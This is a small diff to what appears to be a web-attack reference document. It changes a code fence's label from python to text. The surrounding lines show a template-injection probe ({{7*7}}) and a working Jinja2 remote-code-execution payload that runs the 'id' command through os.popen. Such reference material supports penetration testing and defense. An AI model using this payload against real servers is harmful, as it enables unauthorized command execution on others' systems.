@@ -156,7 +156,7 @@ See [auth-jwt.md](auth-jwt.md) for full JWT/JWE attacks and session manipulation
 
 **Detection:** `{{7*7}}` returns `49`
 
-```python
+```text
 # Jinja2 RCE
 {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
 # Go template
